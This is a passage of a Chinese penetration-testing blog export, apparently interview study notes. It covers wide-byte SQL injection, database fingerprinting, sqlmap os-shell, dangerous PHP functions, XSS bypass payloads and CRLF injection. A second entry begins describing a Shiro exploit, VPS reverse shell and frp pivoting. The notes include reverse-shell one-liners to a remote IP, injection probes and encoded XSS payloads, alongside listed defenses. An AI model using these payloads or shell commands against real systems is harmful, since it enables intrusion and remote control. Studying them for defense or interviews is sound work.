GBK，当服务器添加对用户输入的内容进行转义的时候，也就是php.ini配置文件中添加magic_quotes.gpc&#x3D;on.或者是使用一些转义函数，比如：addslashesi和mysql.real_escape_.string,他们转义的字符是单引号()、双引号(“)、反斜线0与NUL(NULL字符)，转义的方式就是在这些符号前面自动加上\，让这些符号的意义失效，或者可以理解为被注释掉了。</p><p>那么要想在转义的情况下继续进行sql注入，我们就需要将添加的\干掉,怎么干掉呢，也就是借助编码的不同：</p><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉字，所以 %df 时候会和转义符  %5c 进⾏结合，是一个汉字, 将添加的\以%5c的形式和其他的结合其他，将\干掉！</p><p>所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。此时我们可以进行进行sql注入了！！！</p><h3 id="宽字节注入解决方法"><a href="#宽字节注入解决方法" class="headerlink" title="宽字节注入解决方法"></a>宽字节注入解决方法</h3><p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为UTF-8。或对数据进⾏正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。</p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><ol><li><p>使用报错信息判断</p></li><li><p>使用数据库特有的函数、符号来判断</p></li></ol><p>注意：‘;’是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库</p><table><thead><tr><th><strong>MySQL</strong></th><th><strong>SQL Server</strong></th><th><strong>Oracle</strong></th></tr></thead><tbody><tr><td>length()</td><td>len()</td><td>length()</td></tr><tr><td>@@version, version();</td><td>@@version;</td><td>二者都返回错误可能是oracle</td></tr><tr><td>substring, substr</td><td>substring()</td><td>substr()</td></tr><tr><td>trim(),  rtrim(),  ltrim()</td><td>rtrim(),  ltrim()</td><td>rtrim(),  ltrim()</td></tr><tr><td>concat(),+  (||默认不可)</td><td>+</td><td>concat(),||</td></tr><tr><td>#, –[0x20], &#x2F;**&#x2F;</td><td>– , &#x2F;**&#x2F;</td><td>REM, – , &#x2F;**&#x2F;</td></tr><tr><td>BENCHMARK()、SLEEP()</td><td>WAITFOR  DELAY</td><td>dbms_pipe.receive_message()</td></tr><tr><td>length(version())</td><td>len(@@version)</td><td>二者都返回错误可能是oracle</td></tr></tbody></table><ol start="3"><li>使用该类型数据库特有的数据库、系统表</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#mysql：</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) frominformation_schema.TABLES)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">#mssql:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) fromsysobjects)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">#oracle:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) fromsys.user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ol start="4"><li>信息搜集，如端口号、服务端语言等</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle：默认端口1521</span><br><span class="line">SQL Server：默认端口1433</span><br><span class="line">MySQL：默认端口3306</span><br><span class="line"></span><br><span class="line">asp：SQL Server、Access</span><br><span class="line">php：MySQL</span><br><span class="line">java：Oracle，MySQL</span><br></pre></td></tr></table></figure><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="sqlmap用过吗，简单说一下–os-shell原理"><a href="#sqlmap用过吗，简单说一下–os-shell原理" class="headerlink" title="sqlmap用过吗，简单说一下–os-shell原理"></a>sqlmap用过吗，简单说一下–os-shell原理</h3><p>就是通过mysql的写入文件函数，写一个小马，用于文件上传，再通过这个小马上传一个文件执行并且回显服务端的大马（这个文件可以用来执行系统命令，并且将结果返回出来），结束后删除文件清理痕迹。</p><h3 id="sqlmap写shell条件："><a href="#sqlmap写shell条件：" class="headerlink" title="sqlmap写shell条件："></a>sqlmap写shell条件：</h3><blockquote><p>1.具有root权限（因为要写文件）</p><p>2.知道网站绝对路径,那么怎么获知绝对路径呢？</p><blockquote><ol><li>网站指纹</li><li>报错</li><li>默认目录，一些服务器常见的目录</li><li>一些函数会提取服务器信息</li></ol></blockquote><p>3.没开启GPC转义</p><p>4.secure_file_prie&#x3D;空或者是指定的目录</p><blockquote><p><a href="https://www.yisu.com/zixun/113.htmlMYSQL%E7%9A%84secure_file_priv%E5%8F%82%E6%95%B0%E6%80%8E%E4%B9%88%E7%94%A8%EF%BC%9F">https://www.yisu.com/zixun/113.htmlMYSQL的secure_file_priv参数怎么用？</a></p></blockquote></blockquote><h3 id="sqlmap常见参数"><a href="#sqlmap常见参数" class="headerlink" title="sqlmap常见参数"></a>sqlmap常见参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u: 指定目标URL</span><br><span class="line">-b: 获取DBMSbanner</span><br><span class="line">–current-db : 获取当前数据库</span><br><span class="line">–current-user:获取当前用户</span><br><span class="line">–users : 枚举DBMS用户</span><br><span class="line">–password: 枚举DBMS用户密码hash</span><br></pre></td></tr></table></figure><h2 id="其他小问题"><a href="#其他小问题" class="headerlink" title="其他小问题"></a>其他小问题</h2><ol><li>mysql的用户名密码是存放在那张表里面？mysql 密码采用哪种加密方式？</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -&gt; users</span><br><span class="line">SHA1</span><br></pre></td></tr></table></figure><ol start="2"><li>请写出 Mysql5 数据库中查询库’helloworld’中’users’表所有列名的语句</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="3"><li>mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</li></ol><blockquote><ul><li>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。</li><li>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。</li></ul></blockquote><ol start="4"><li>MySQL、ACCESS和SQLserver的区别</li></ol><blockquote><ul><li>MySQL脱库时使用information_schema默认数据库,其中schemata存数据库,tables存表,columns存字段;SQLserver脱库时使用系统表,databases存数据库,objects存表,columns存字段</li><li>MySQL支持limnt分页,SQLserver只能用top来替代分页</li><li>MySQL支持双系统,SQLserver只能支持Windows系统</li></ul></blockquote><p>三者注释区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL:        -- , /**/ , #SQLserver    -- , /**/</span><br><span class="line">Oracle           -- , /**/</span><br><span class="line">Access          没有注释</span><br></pre></td></tr></table></figure><ol start="5"><li>为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</li></ol><blockquote><ul><li>更改了端⼝，没有扫描出来。</li><li>站库分离</li><li>3306 端⼝不对外开放</li></ul></blockquote><ol start="6"><li>SQL 头部注⼊点</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UserAgent </span><br><span class="line">Referer </span><br><span class="line">Cookie </span><br><span class="line">XFF</span><br></pre></td></tr></table></figure><ol start="7"><li>注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</li></ol><p>and&#x2F;or&#x2F;xor，前⾯的 1&#x3D;1、1&#x3D;2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。</p><ol start="8"><li>sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. demo.jsp?id=2+1</span><br><span class="line">B. demo.jsp?id=2-1</span><br></pre></td></tr></table></figure><blockquote><p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p></blockquote><h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行+代码执行"></a>命令执行+代码执行</h1><h2 id="php命令执行和代码执行相关函数"><a href="#php命令执行和代码执行相关函数" class="headerlink" title="php命令执行和代码执行相关函数"></a>php命令执行和代码执行相关函数</h2><blockquote><p>危险函数</p></blockquote><h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p>代码执行漏洞应用有时需要调用⼀些执行系统命令的函数，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。简单来说就是：”靠执行脚本代码调用操作系统命令“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(), </span><br><span class="line"><span class="title function_ invoke__">popen</span>(),</span><br><span class="line"><span class="title function_ invoke__">exec</span>(), <span class="title function_ invoke__">shell_exec</span>(), </span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()，</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() ,</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 ``</span><br></pre></td></tr></table></figure><h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p>代码执行是指应用程序在调用⼀些能够将字符串转换为代码的函数时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞，使得用户能利用任意脚本代码(PHP)。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()、<span class="title function_ invoke__">assert</span>()、</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>()                                （PHP&lt;<span class="number">5.5</span>.<span class="number">0</span>）</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()、<span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line"><span class="title function_ invoke__">create_function</span>()</span><br><span class="line"><span class="variable">$_GET</span>[‘a’](<span class="variable">$_GET</span>[‘b’]);                        可变函数</span><br><span class="line"><span class="keyword">include</span>、<span class="keyword">require</span> … …                        开启allow_url_include（php&gt;<span class="number">5.2</span>.<span class="number">0</span>）</span><br></pre></td></tr></table></figure><h3 id="⽂件读取函数："><a href="#⽂件读取函数：" class="headerlink" title="⽂件读取函数："></a>⽂件读取函数：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fifile_get_contents</span>(),</span><br><span class="line"><span class="title function_ invoke__">highlight_fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">fopen</span>(),</span><br><span class="line">read <span class="title function_ invoke__">fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">fread</span>(),</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>(),<span class="title function_ invoke__">fgets</span>(),</span><br><span class="line"><span class="title function_ invoke__">parse_ini_fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(),</span><br><span class="line"><span class="title function_ invoke__">fifile</span>() 等</span><br></pre></td></tr></table></figure><h2 id="反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777 -e /bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1</span><br><span class="line">bash 是交互式, 否则像 useradd ⽆法执⾏交互</span><br></pre></td></tr></table></figure><h2 id="命令执行防御"><a href="#命令执行防御" class="headerlink" title="命令执行防御"></a>命令执行防御</h2><blockquote><ol><li>尽量不要执行外部命令</li><li>使用自定义函数或者函数库来代替外部命令的功能。</li><li>使用escapeshellarg()、escapeshellcmd()函数来处理命令参数。</li><li>禁用一些敏感字符 比如 ； &amp;&amp;  cat 等连接符与常用命令</li><li>过滤关键字符、控制回显</li></ol></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="你怎么理解-xss-攻击？"><a href="#你怎么理解-xss-攻击？" class="headerlink" title="你怎么理解 xss 攻击？"></a>你怎么理解 xss 攻击？</h2><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。</p><h2 id="XSS利用条件："><a href="#XSS利用条件：" class="headerlink" title="XSS利用条件："></a>XSS利用条件：</h2><blockquote><ul><li>网站页面可传入参数，并嵌入其中</li><li>该参数用户可控</li><li>参数过滤不严格</li></ul></blockquote><h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍、记录用户的键盘输入、网站挂马，篡改网页内容……</p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><p>从⽹络层、主机层、Web 层、数据库，不同层次有不同方法：（话题比较大）</p><ul><li>对输入和URL参数进行过滤，输入时进行校验</li></ul><blockquote><ol><li><p>限制输入数据长度</p></li><li><p>对输入数据格式进行验证（纯数字、符合邮箱、用户名格式）</p></li><li><p>过滤、删除危险字符</p></li></ol></blockquote><ul><li>对输出进行编码</li></ul><blockquote><p>1.php使用<strong>htmlspeicalchars()函数</strong>，<strong>输出实体编码</strong>。经由htmlspeicalchars()过滤或转译参数,被转义后原本输入的内容就不属于js代码了，就会将我们输入的脚本当作单纯的内容打印出来</p></blockquote><ul><li>设置HttpOnly 防止cookie被js盗取，禁⽌ JavaScript 读取 Cookie 值，网页就不允许提取cookie了</li></ul><blockquote><p><code>1.session.cookie_httponly=1</code></p></blockquote><ul><li>设置CSP:Content Security Policy(内容安全策略)，其旨在减少跨站脚本攻击。由开发者定义一些安全性的策略声明，来指定可信的内容</li><li>其他：</li></ul><blockquote><p>通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可以了，添加 CDN 只是让攻击成本增⾼、ModSecurity 类的防⽕墙。</p></blockquote><h2 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h2><ul><li>闭合标签绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•&lt;textarea&gt;、&lt;title&gt;等RCDATA标签内无法使用JavaScript，如果遇到这种标签，想利用xss需要先使用《&lt;/textarea&gt;、&lt;/title&gt;闭合标签，再输入脚本，xss.haozi.me网站第二关</span><br><span class="line">•value等元素属性闭合，需要先闭合引号，或者是尖括号  xss.haozi.me网站第三关</span><br><span class="line">•&lt;!----!&gt; &lt;!-- --&gt;注释闭合</span><br></pre></td></tr></table></figure><ul><li>绕过小括号、双引号、单引号</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•利用反引号``</span><br><span class="line">    &lt;script&gt;alert`1`&lt;/script&gt;</span><br><span class="line">•编码绕过(利用实体编码、unicode编码绕过)</span><br><span class="line">        &lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;  属性内可以识别html实体编码</span><br><span class="line">                                    &amp;#x28；是（的实体编码，&amp;#x29;是）的实体编码</span><br><span class="line">        &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;  &lt;svg&gt;遵循XML 和 SVG 的定义</span><br><span class="line">                                        酱紫才可以采用实体编码去绕过</span><br></pre></td></tr></table></figure><ul><li>混淆绕过（利用html语法不严格、容错性）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换行(第六关）</span><br><span class="line">缺失&gt;闭合的标签</span><br><span class="line">空格、TAB</span><br></pre></td></tr></table></figure><ul><li>关键字绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•大小写绕过</span><br><span class="line">•编码绕过</span><br><span class="line">    •&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line">    =&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41就是alert(1)的实体编码，即使script关键字可能被服务器绕过，但是onerror也是支持JavaScript脚本的</span><br><span class="line">    •&lt;svg&gt;&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;</span><br><span class="line">    当识别&lt;svg&gt;会先将上面的实体编码解码 ，再执行</span><br><span class="line">•字符拼接</span><br><span class="line">    &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;    </span><br><span class="line">    &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>空格绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•利用/代替空格</span><br><span class="line">    •&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;</span><br><span class="line">•编码绕过(利用实体编码、unicode编码绕过)</span><br><span class="line">    •&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;  属性内可以识别html实体编码</span><br><span class="line">    •&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;  &lt;svg&gt;遵循XML 和 SVG 的定义</span><br></pre></td></tr></table></figure><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到请求参数中。反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击</p><h2 id="存储型-xss-原理"><a href="#存储型-xss-原理" class="headerlink" title="存储型 xss 原理?"></a>存储型 xss 原理?</h2><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触发漏洞。</p><p>XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处。</p><h2 id="Dom-xss-原理-x2F-防范-x2F-危害"><a href="#Dom-xss-原理-x2F-防范-x2F-危害" class="headerlink" title="Dom xss 原理 &#x2F; 防范&#x2F;危害"></a>Dom xss 原理 &#x2F; 防范&#x2F;危害</h2><p><strong>原理：</strong></p><p>DOM 型 XSS 并不需要服务器解析响应的，直接参与触发 XSS 靠的是浏览器 DOM 解析。客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行</p><p>DOM—based XSS 漏洞是基于⽂档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cument.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;yyyyyy&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>防御</strong>：在输⼊点过滤敏感关键字</p><p><strong>危害：</strong></p><blockquote><p>（1）DOM-XSS不经过服务器端，只查看服务端的日志和数据库，很难排查到</p><p>（2）DOM-XSS一般是通杀浏览器的</p><p>（3）DOM-XSS一般是被攻击的时候就执行了XSS，由于是前端DOM操作导致，很难留下痕迹</p></blockquote><h2 id="反射型、存储型及DOM型xss区别"><a href="#反射型、存储型及DOM型xss区别" class="headerlink" title="反射型、存储型及DOM型xss区别"></a>反射型、存储型及DOM型xss区别</h2><blockquote><p>[反射型XSS、存储型XSS及DOM型XSS到底有什么区别？？？？？](<a href="https://blog.csdn.net/qq_41734243/article/details/106123846#:~:text=DOM%E5%9E%8BXSS%E7%9A%84%E8%A2%AB%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E5%85%B6%E5%AE%9E%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%A2%AB%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E5%B0%B1%E6%98%AF%E7%BB%99%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E6%94%BE%E9%80%81URL%E3%80%82">https://blog.csdn.net/qq_41734243/article/details/106123846#:~:text=DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</a> 反射型XSS的脚本被解析的地方是浏览器，而存储型XSS的脚本被解析的地方是服务器，DOM型XSS也是浏览器，所以DOM型又叫DOM反射型XSS。,但是反射型XSS需要联网，而DOM型不需要！ 反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有，DOM型XSS和反射型差不多，但是用人就扯淡了，那反射型只要不改变源代码不就是一直存在吗？)</p></blockquote><blockquote><p>一、被攻击对象的不同</p><blockquote><ul><li>反射型XSS的被攻击对象一般是攻击者去寻找的</li><li>存储型XSS是广撒网的方式或者指定的方式</li><li>DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</li></ul></blockquote><p>二、解析位置不同（个人感觉是反射型与存储型区别的本质）</p><blockquote><p>反射型XSS和存储型XSS<strong>都会和服务器产生交互</strong>，恶意代码由服务器端通过响应包返回给客户端；而DOM型XSS不会和服务器产生交互，恶意代码由前端的JavaScript处理。</p></blockquote><p>三、存储时间不同</p><blockquote><p>反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有</p></blockquote><p>四、允许输入点的不同（这是DOM型与其他两种的区别）</p><blockquote><p>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p></blockquote><p>五、DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</p></blockquote><h2 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h2><ul><li>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。</li></ul><blockquote><p><strong>修复⽅式</strong>：对字符实体进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web应⽤端采⽤相同的字符编码。</p></blockquote><ul><li>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认。</li></ul><blockquote><p><strong>修复⽅式</strong>：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer  </p></blockquote><ul><li>XXE 是 XML 外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。</li></ul><blockquote><p><strong>修复⽅式</strong>：XML 解析库在调⽤时严格禁⽌对外部实体的解析。</p></blockquote><h2 id="其他小问题-1"><a href="#其他小问题-1" class="headerlink" title="其他小问题"></a>其他小问题</h2><ol><li>如何快速发现 xss 位置？</li></ol><blockquote><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。</p></blockquote><ol start="2"><li>如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</li></ol><blockquote><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ <strong>fuzzing 测试</strong>。</p><p>如果是<strong>存储型⻚⾯查找关键字</strong>。</p></blockquote><ol start="3"><li>如何使得前端 referer 为空</li></ol><blockquote><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。</p><p>referer和xff可以伪造</p></blockquote><ol start="4"><li>cookie 参数，security ⼲什么的（此问题不理解)</li></ol><blockquote><ul><li>Httponly：防⽌ cookie 被 xss 偷</li><li>https：防⽌ cookie 在⽹络中被偷</li><li>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉</li><li>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突</li></ul></blockquote><h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><p>原理:HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（rn）的简称。</p><p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 Cookie 或者 HTML 代码，所以 CRLFInjection ⼜叫 HTTP Response Splitting，简称 HRS。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x26 - Socks代理实战</title>
      <link href="/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98/"/>
      <url>/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>l  首先进行了信息收集，在扫目录的时候发现了一些敏感目录，访问其中一个目录的时候，登录发现了shiro组件及其漏洞（在burp挂了被动扫描，burp上安装了shiroscan组件，扫描到访问的网页的时候发现了shiro漏洞）</p><p>l  然后使用shiro漏洞利用工具，反弹shell到VPS，然后本地起一个临时的python的web服务器，在目标机器上wget下载冰蝎的一句话木马，拿下了VPS；也尝试了用shiro工具在网站种注入蚁剑的内存shell，用蚁剑连接，也拿到了shell</p><p>l  拿到目标机器后，ipconfig发现该web服务器下面还存在其他网段，用fscan扫他发现其他存活主机。开始搭建frp代理：自己VPS上搭建frp服务端frps，在拿到shell的服务器上上传frp工具及搭建frpc，连接服务端。搭建好socks5代理后，在自己VPS上上通过proxychains，使用nmap内网网段中的主机，发现21 和3306 端口开启，应该是ftp和mysql服务，尝试查找漏洞，利用海德拉爆破弱口令，拿到mysql</p><h1 id="Socks代理简介"><a href="#Socks代理简介" class="headerlink" title="Socks代理简介"></a>Socks代理简介</h1><h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>我们正常的HTTP通信是这样的：</p><blockquote><p>1.客户端先通过TCP与服务器建立一条连接&amp;#x20;</p><p>2.连接建立完成后，客户端向服务器发送请求（比如GET &#x2F;hello.html HTTP&#x2F;1.1，意为我想要取得服务器根目录&#x2F;下的hello.html文件）&amp;#x20;</p><p>3. 服务器接收到客户端发来的请求，找到所请求的文件，并通过原来的连接发回去。（接上条的例子，找到根目录&#x2F;下的hello.html文件，并发送HTTP&#x2F;1.1 200 OK，代表找到了这个文件，现在我就发送给你）&amp;#x20;</p><p>4. 客户端接收到服务器传过来的文件，并用浏览器渲染出来给用户看（通过html&#x2F;css以及js等把传回来的文本内容可视化，展示在屏幕上）</p></blockquote><p>而我们通过代理服务器A进行HTTP通信则是这样的：</p><blockquote><p>1.客户端先与A建立TCP连接，然后告诉代理服务器A我想要访问某某网址根目录下的hello.html&amp;#x20;</p><p>2. 代理服务器A收到客户端请求，再建立一条到服务端的TCP连接，把这个请求通过这个连接转发到服务端。&amp;#x20;</p><p>3. 这样在服务器看来，就好像是客户端请求了&#x2F;hello.html一样，然后把所请求的内容返回回去，代理服务器再把内容通过与客户端的连接送回客户端</p></blockquote><p>代理服务器A作为一个中间人，负责转发客户端请求消息以及服务端响应消息</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理（Forward 